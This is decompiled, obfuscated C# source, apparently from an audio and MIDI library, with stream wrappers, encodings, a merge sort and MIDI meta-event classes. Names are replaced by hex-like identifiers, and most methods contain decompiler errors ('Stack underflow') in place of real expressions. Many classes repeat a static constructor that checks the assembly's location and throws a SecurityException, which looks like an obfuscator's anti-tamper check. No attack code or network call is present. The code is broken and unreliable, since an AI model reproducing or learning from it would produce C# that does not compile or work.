namespace _0010
{
	[StructLayout(LayoutKind.Sequential, Pack = 4)]
	internal struct _000F
	{
		public int _0001;

		public int _0002;

		public int _0003;

		public int _0004;

		public global::_0003._0008 _0001;

		public global::_0002._0011 _0001;
	}
}
namespace _0018
{
	internal sealed class _0011
	{
		static _0011()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0007
{
	[AttributeUsage(AttributeTargets.Field)]
	internal sealed class _0010 : Attribute
	{
		[CompilerGenerated]
		private string _0001;

		public string Description
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0010)/*Error near IL_0009: Stack underflow*/)._0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0010(string _009A_0018)
		{
			Description = _009A_0018;
		}

		public override string _0002()
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			_ = ((_0010)/*Error near IL_000d: Stack underflow*/).Description;
			return (string)/*Error near IL_0005: Stack underflow*/;
		}
	}
}
namespace _0012
{
	internal static class _0008
	{
		static _0008()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0019
{
	internal static class _000F
	{
	}
}
namespace _0004
{
	internal static class _000F
	{
		public static int _0001<_0001>()
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			_ = typeof(_0001);
			Marshal.SizeOf((Type)/*Error near IL_0016: Stack underflow*/);
			return (int)/*Error near IL_000a: Stack underflow*/;
		}

		public static IntPtr _0001<_0001>(string _0002)
		{
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			_ = typeof(_0001);
			Marshal.OffsetOf((Type)/*Error near IL_001b: Stack underflow*/, (string)/*Error near IL_001b: Stack underflow*/);
			return (IntPtr)/*Error near IL_000c: Stack underflow*/;
		}

		public static _0001 _0001<_0001>(IntPtr _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			_ = typeof(_0001);
			Marshal.PtrToStructure((IntPtr)/*Error near IL_0020: Stack underflow*/, (Type)/*Error near IL_0020: Stack underflow*/);
			return (_0001)(object)/*Error near IL_000c: Stack underflow*/;
		}

		static _000F()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0002
{
	internal static class _0012
	{
		public static TimeSpan _0001(this _001F._0006 _0002)
		{
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_0044: Incompatible stack heights: 0 vs 2
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			_ = _0003_0003._001F_0006;
			((_001F._0006)/*Error near IL_004b: Stack underflow*/)._0001();
			int num = ((_001F._0006)/*Error near IL_0010: Stack underflow*/).OutputWaveFormat._0001 * _0002.OutputWaveFormat._0003 / 8;
			double num2 = (double)(/*Error near IL_0025: Stack underflow*/ / num) * 1000.0 / (double)_0002.OutputWaveFormat._0001;
			return /*Error near IL_0042: Stack underflow*/(num2);
		}
	}
}
namespace _0080
{
	internal static class _000F
	{
		static _000F()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0014._0001(107396751), _0014._0001(107396746)), _0014._0001(107396741), _0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0014._0001(107396706));
		}
	}
}
namespace _0007
{
	internal sealed class _0011
	{
	}
}
namespace _001D
{
	internal static class _0012
	{
		static _0012()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _000E
{
	internal sealed class _0012 : Encoding
	{
		public static readonly _0012 _0001;

		private _0012()
		{
		}

		public override int _0001(char[] _0002, int _0003, int _0004)
		{
			//IL_0004: Incompatible stack heights: 0 vs 1
			return (int)/*Error near IL_0003: Stack underflow*/;
		}

		public override int _0001(char[] _0002, int _0003, int _0004, byte[] _0005, int _0006)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			for (int i = 0; i < _0004; i++)
			{
				_003F val = /*Error near IL_000b: Stack underflow*/+ i;
				char num = _0002[_0003 + i];
				((sbyte[])/*Error near IL_0012: Stack underflow*/)[val] = (sbyte)(byte)num;
			}
			return _0004;
		}

		public override int _0001(byte[] _0002, int _0003, int _0004)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			for (int i = 0; i < _0004; i++)
			{
				_003F val = /*Error near IL_000b: Stack underflow*/+ i;
				if (((byte[])/*Error near IL_000c: Stack underflow*/)[val] == 0)
				{
					return i;
				}
			}
			return _0004;
		}

		public override int _0001(byte[] _0002, int _0003, int _0004, char[] _0005, int _0006)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			for (int i = 0; i < _0004; i++)
			{
				_003F val = /*Error near IL_000b: Stack underflow*/+ i;
				byte b = ((byte[])/*Error near IL_000c: Stack underflow*/)[val];
				if (b == 0)
				{
					return i;
				}
				_0005[_0006 + i] = (char)b;
			}
			return _0004;
		}

		public override int _0001(int _0002)
		{
			//IL_0004: Incompatible stack heights: 0 vs 1
			return (int)/*Error near IL_0003: Stack underflow*/;
		}

		public override int _0002(int _0002)
		{
			//IL_0004: Incompatible stack heights: 0 vs 1
			return (int)/*Error near IL_0003: Stack underflow*/;
		}

		static _0012()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			new _0012();
			_0012._0001 = (_0012)/*Error near IL_0007: Stack underflow*/;
		}
	}
}
namespace _0019
{
	internal sealed class _0010
	{
		internal readonly byte[] _0001;

		internal readonly object _0001;

		internal int _0001;

		internal int _0002;

		internal int _0003;

		public int MaxLength => ((_0010)/*Error near IL_0007: Stack underflow*/)._0001.Length;

		public int Count
		{
			get
			{
				//IL_002f: Incompatible stack heights: 0 vs 1
				//IL_0035: Incompatible stack heights: 0 vs 2
				object obj = ((_0010)/*Error near IL_0007: Stack underflow*/)._0001;
				object obj2 = default(object);
				if (0 == 0)
				{
					obj2 = obj;
				}
				_ = _0091_0002._009C_0005;
				/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/);
				try
				{
					return _0003;
				}
				finally
				{
					_0091_0002._009D_0005(obj2);
				}
			}
		}

		public _0010(int _001E_001E)
		{
			this._0001 = new byte[_001E_001E];
			this._0001 = new object();
		}

		static _0010()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0001
{
	internal sealed class _000F
	{
		private const double _0001 = 8.685889638065037;

		private const double _0002 = 0.11512925464970228;
	}
}
namespace _0013
{
	internal static class _000F
	{
		public const int _0001 = 0;

		public const int _0002 = 1;

		public const int _0003 = -2147483645;

		private const int _0004 = 18;

		private const int _0005 = 20;

		private const int _0006 = 32;

		private const int _0007 = 11;

		private const int _0008 = 17;

		private const int _000E = 33;

		private const int m__000F = 10;

		private const int _0010 = 2;

		private const int _0011 = 21;

		private const int _0012 = 25;

		private const int _0013 = 12;

		private const int _0014 = 4;

		private const int _0015 = 13;

		private const int _0016 = 14;

		private const int _0017 = 0;

		private const int _0018 = 1;

		private const int _0019 = 16;

		private const int _001A = 9;

		private const int _001B = 15;

		private const int _001C = 9;

		private const int _001D = 3;

		private const int _001E = 23;

		private const int _001F = 22;

		private const int _007F = 19;

		private const int _0080 = 7;

		private const int _0081 = 8;

		private const int _0082 = 24;

		public static int _0001(this COMException _0002)
		{
			//IL_000b: Incompatible stack heights: 0 vs 2
			//IL_0012: Incompatible stack heights: 0 vs 1
			_ = global::_001A._007E_0017_0003;
			/*Error near IL_0012: Stack underflow*/((object)/*Error near IL_0012: Stack underflow*/);
			return (int)/*Error near IL_000a: Stack underflow*/;
		}

		static _000F()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0005
{
	internal sealed class _0010 : Stream
	{
		[CompilerGenerated]
		private Stream m__0001;

		[CompilerGenerated]
		private bool m__0001;

		public Stream SourceStream
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0010)/*Error near IL_0009: Stack underflow*/).m__0001 = (Stream)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public bool IgnoreDispose
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0010)/*Error near IL_0009: Stack underflow*/).m__0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public override bool CanRead
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 2
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				_ = global::_001B._007E_0087_0003;
				_ = ((_0010)/*Error near IL_0014: Stack underflow*/).SourceStream;
				/*Error near IL_001b: Stack underflow*/((object)/*Error near IL_001b: Stack underflow*/);
				return (byte)/*Error near IL_000c: Stack underflow*/ != 0;
			}
		}

		public override bool CanSeek
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 2
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				_ = global::_001B._007E_0088_0003;
				_ = ((_0010)/*Error near IL_0014: Stack underflow*/).SourceStream;
				/*Error near IL_001b: Stack underflow*/((object)/*Error near IL_001b: Stack underflow*/);
				return (byte)/*Error near IL_000c: Stack underflow*/ != 0;
			}
		}

		public override bool CanWrite
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 2
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				_ = global::_001B._007E_0089_0003;
				_ = ((_0010)/*Error near IL_0014: Stack underflow*/).SourceStream;
				/*Error near IL_001b: Stack underflow*/((object)/*Error near IL_001b: Stack underflow*/);
				return (byte)/*Error near IL_000c: Stack underflow*/ != 0;
			}
		}

		public override long Length
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 2
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				_ = global::_0012._007E_0090_0002;
				_ = ((_0010)/*Error near IL_0014: Stack underflow*/).SourceStream;
				/*Error near IL_001b: Stack underflow*/((object)/*Error near IL_001b: Stack underflow*/);
				return (long)/*Error near IL_000c: Stack underflow*/;
			}
		}

		public override long Position
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 2
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				_ = global::_0012._007E_0091_0002;
				_ = ((_0010)/*Error near IL_0014: Stack underflow*/).SourceStream;
				/*Error near IL_001b: Stack underflow*/((object)/*Error near IL_001b: Stack underflow*/);
				return (long)/*Error near IL_000c: Stack underflow*/;
			}
			set
			{
				//IL_0012: Incompatible stack heights: 0 vs 2
				//IL_0019: Incompatible stack heights: 0 vs 1
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = _007F_0002._007E_0083_0005;
				_ = ((_0010)/*Error near IL_0019: Stack underflow*/).SourceStream;
				/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/, (long)/*Error near IL_0010: Stack underflow*/);
			}
		}

		public _0010(Stream _0010_0090_0006)
		{
			SourceStream = _0010_0090_0006;
			IgnoreDispose = true;
		}

		public override void _0001()
		{
			//IL_000d: Incompatible stack heights: 0 vs 2
			//IL_0014: Incompatible stack heights: 0 vs 1
			_ = global::_0008._007E_0001_0002;
			_ = ((_0010)/*Error near IL_0014: Stack underflow*/).SourceStream;
			/*Error near IL_001b: Stack underflow*/((object)/*Error near IL_001b: Stack underflow*/);
		}

		public override int _0001(byte[] _0002, int _0003, int _0004)
		{
			//IL_0014: Incompatible stack heights: 0 vs 2
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			_ = _0082._007E_0006_0004;
			_ = ((_0010)/*Error near IL_001b: Stack underflow*/).SourceStream;
			return /*Error near IL_0012: Stack underflow*/((object)/*Error near IL_0012: Stack underflow*/, (byte[])/*Error near IL_0012: Stack underflow*/, _0003, _0004);
		}

		public override long _0001(long _0002, SeekOrigin _0003)
		{
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = _000E_0003._007E_0089_0006;
			_ = ((_0010)/*Error near IL_001a: Stack underflow*/).SourceStream;
			return /*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, (long)/*Error near IL_0011: Stack underflow*/, _0003);
		}

		public override void _0002(long _0002)
		{
			//IL_0012: Incompatible stack heights: 0 vs 2
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 1
			_ = _007F_0002._007E_0084_0005;
			_ = ((_0010)/*Error near IL_0019: Stack underflow*/).SourceStream;
			/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/, (long)/*Error near IL_0010: Stack underflow*/);
		}

		public override void _0001(byte[] _0002, int _0003, int _0004)
		{
			//IL_0014: Incompatible stack heights: 0 vs 2
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			_ = _0083._007E_0008_0004;
			_ = ((_0010)/*Error near IL_001b: Stack underflow*/).SourceStream;
			/*Error near IL_0012: Stack underflow*/((object)/*Error near IL_0012: Stack underflow*/, (byte[])/*Error near IL_0012: Stack underflow*/, _0003, _0004);
		}

		protected override void _0002(bool _0002)
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 2
			_ = ((_0010)/*Error near IL_0027: Stack underflow*/).IgnoreDispose;
			if ((int)/*Error near IL_0006: Stack underflow*/ == 0)
			{
				_ = global::_0008._007E_0004_0002;
				Stream stream = ((_0010)/*Error near IL_0012: Stack underflow*/).SourceStream;
				/*Error near IL_0017: Stack underflow*/(stream);
				SourceStream = null;
			}
		}
	}
}
namespace _0017
{
	internal sealed class _0016
	{
		private static void _0001<_0001>(IList<_0001> _0002, int _0003, int _0004, IComparer<_0001> _0005)
		{
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected I4, but got Unknown
			//IL_009c: Incompatible stack heights: 0 vs 1
			//IL_00a2: Incompatible stack heights: 0 vs 1
			//IL_00a8: Incompatible stack heights: 0 vs 1
			if (/*Error near IL_000c: Stack underflow*/ >= /*Error near IL_000c: Stack underflow*/)
			{
				return;
			}
			int num = (/*Error near IL_0014: Stack underflow*/ + _0004) / 2;
			_0016._0001(_0002, _0003, num, _0005);
			_0016._0001(_0002, num + 1, _0004, _0005);
			int num2 = num;
			int num3 = num + 1;
			while (_0003 <= num2 && num3 <= _0004)
			{
				if (_0005.Compare(_0002[_0003], _0002[num3]) <= 0)
				{
					_0003++;
					continue;
				}
				_0001 value = _0002[num3];
				for (int num4 = num3 - 1; num4 >= _0003; num4--)
				{
					_0002[num4 + 1] = _0002[num4];
				}
				_0002[_0003] = value;
				_0003++;
				num2++;
				num3++;
			}
		}

		public static void _0001<_0001>(IList<_0001> _0002) where _0001 : IComparable<_0001>
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Expected I4, but got Unknown
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 2
			//IL_001f: Incompatible stack heights: 0 vs 1
			_ = 0;
			_ = ((ICollection<_0001>)/*Error near IL_001f: Stack underflow*/).Count;
			_003F val = /*Error near IL_0009: Stack underflow*/- 1;
			_0016._0001(_0005: (IComparer<_0001>)Comparer<_0001>.Default, _0002: (IList<_0001>)/*Error near IL_0013: Stack underflow*/, _0003: (int)/*Error near IL_0013: Stack underflow*/, _0004: (int)val);
		}

		public static void _0001<_0001>(IList<_0001> _0002, IComparer<_0001> _0003)
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000f: Expected I4, but got Unknown
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 2
			//IL_001b: Incompatible stack heights: 0 vs 1
			_ = 0;
			_ = ((ICollection<_0001>)/*Error near IL_001b: Stack underflow*/).Count;
			_0016._0001(_0004: /*Error near IL_0009: Stack underflow*/- 1, _0002: (IList<_0001>)/*Error near IL_000f: Stack underflow*/, _0003: (int)/*Error near IL_000f: Stack underflow*/, _0005: _0003);
		}

		static _0016()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0019
{
	internal sealed class _0011 : UserControl
	{
		private delegate void _0001(Color color, string message);

		private delegate void _0002();

		private IContainer m__0001;

		internal RichTextBox _0001;

		public string Text
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = global::_0002._007E_000E;
				RichTextBox obj = ((_0011)/*Error near IL_000c: Stack underflow*/)._0001;
				/*Error near IL_0017: Stack underflow*/(obj);
				return (string)/*Error near IL_000f: Stack underflow*/;
			}
		}

		public _0011()
		{
			global::_0011._0018._0001(this);
		}

		public void _0001(Color _0002, string _0003)
		{
			//IL_00a4: Incompatible stack heights: 0 vs 2
			//IL_00ae: Incompatible stack heights: 0 vs 1
			//IL_00b4: Incompatible stack heights: 0 vs 2
			_ = global::_001B._007E_0083_0003;
			RichTextBox obj = ((_0011)/*Error near IL_000f: Stack underflow*/)._0001;
			/*Error near IL_00ae: Stack underflow*/(obj);
			if ((int)/*Error near IL_0016: Stack underflow*/ != 0)
			{
				_ = _0089._0014_0004;
				_0001 obj2 = _0001;
				object[] obj3 = new object[2] { _0002, _0003 };
				/*Error near IL_0044: Stack underflow*/((object)/*Error near IL_0044: Stack underflow*/, obj2, obj3);
			}
			else
			{
				_009D_0002._007E_0017_0006(this._0001, global::_001A._007E_0018_0003(this._0001));
				_0081_0003._007E_0005_0007(this._0001, _0002);
				_0082_0003._007E_0007_0007(this._0001, _0003);
				_0082_0003._007E_0007_0007(this._0001, _008F._001D_0004());
			}
		}

		public void _0001()
		{
			//IL_0042: Incompatible stack heights: 0 vs 2
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_004c: Incompatible stack heights: 0 vs 2
			_ = global::_001B._007E_0083_0003;
			RichTextBox obj = ((_0011)/*Error near IL_000c: Stack underflow*/)._0001;
			/*Error near IL_0049: Stack underflow*/(obj);
			if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
			{
				_ = _0089._0014_0004;
				_0002 obj2 = _0001;
				object[] array = new object[0];
				/*Error near IL_002e: Stack underflow*/((object)/*Error near IL_002e: Stack underflow*/, obj2, array);
			}
			else
			{
				global::_0008._007E_0006_0002(this._0001);
			}
		}

		protected override void _0001(bool _0002)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0011)/*Error near IL_000b: Stack underflow*/).m__0001 != null)
			{
				_ = global::_0008._007E_0098;
				IContainer container = ((_0011)/*Error near IL_0019: Stack underflow*/).m__0001;
				/*Error near IL_001e: Stack underflow*/(container);
			}
			global::_0005._0089(this, _0002);
		}
	}
}
namespace _000E
{
	internal sealed class _0013 : global::_0014._0011
	{
		[CompilerGenerated]
		private new byte[] m__0001;

		public byte[] Data
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0013)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0013)/*Error near IL_0009: Stack underflow*/).m__0001 = (byte[])/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0013(MetaEventType _0003_0091_0006, long _0004_0091_0006, byte[] _0087_000F)
			: base(_0003_0091_0006, (_0087_000F != null) ? _0087_000F.Length : 0, _0004_0091_0006)
		{
			Data = _0087_000F;
		}

		public override global::_0013._0010 _0001()
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 2
			//IL_0033: Incompatible stack heights: 0 vs 2
			_ = ((global::_0014._0011)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = ((global::_0013._0010)/*Error near IL_000e: Stack underflow*/)._0001;
			return new _0013(_0087_000F: (byte[])((_0013)/*Error near IL_0015: Stack underflow*/).Data?.Clone(), _0003_0091_0006: (MetaEventType)/*Error near IL_002b: Stack underflow*/, _0004_0091_0006: (long)/*Error near IL_002b: Stack underflow*/);
		}

		public override string ToString()
		{
			//IL_0057: Incompatible stack heights: 0 vs 2
			//IL_005a: Incompatible stack heights: 0 vs 1
			//IL_0061: Incompatible stack heights: 0 vs 1
			_ = _008B_0002._0094_0005;
			new StringBuilder();
			((global::_0014._0011)/*Error near IL_0061: Stack underflow*/).ToString();
			StringBuilder stringBuilder = /*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/, (string)/*Error near IL_0010: Stack underflow*/);
			byte[] array = Data;
			foreach (byte b in array)
			{
				_008C_0002._007E_0095_0005(stringBuilder, _0080._0014._0001(107383847), b);
			}
			return global::_0002._007E_0006(stringBuilder);
		}

		public unsafe override void _0001(ref long _0002, BinaryWriter _0003)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			((global::_0014._0011)/*Error near IL_000b: Stack underflow*/)._0001(ref *(long*)/*Error near IL_000b: Stack underflow*/, (BinaryWriter)/*Error near IL_000b: Stack underflow*/);
			if (Data != null)
			{
				_0083._007E_000E_0004(_0003, Data, 0, Data.Length);
			}
		}

		static _0013()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0014
{
	internal class _0011 : global::_0013._0010
	{
		internal new MetaEventType _0001;

		internal new int _0001;

		public MetaEventType MetaEventType => ((_0011)/*Error near IL_0007: Stack underflow*/)._0001;

		protected internal _0011()
		{
		}

		public _0011(MetaEventType _0003_0091_0006, int _000F_0091_0006, long _0004_0091_0006)
			: base(_0004_0091_0006, 1, MidiCommandCode.MetaEvent)
		{
			this._0001 = _0003_0091_0006;
			this._0001 = _000F_0091_0006;
		}

		public override global::_0013._0010 _0001()
		{
			//IL_001c: Incompatible stack heights: 0 vs 1
			//IL_001f: Incompatible stack heights: 0 vs 2
			//IL_0022: Incompatible stack heights: 0 vs 2
			_ = ((_0011)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = ((_0011)/*Error near IL_000e: Stack underflow*/)._0001;
			return new _0011(_0004_0091_0006: ((global::_0013._0010)/*Error near IL_0015: Stack underflow*/)._0001, _0003_0091_0006: (MetaEventType)/*Error near IL_001a: Stack underflow*/, _000F_0091_0006: (int)/*Error near IL_001a: Stack underflow*/);
		}

		public override string ToString()
		{
			//IL_002f: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 2
			_ = _009D._0093_0004;
			_0080._0014._0001(107395853);
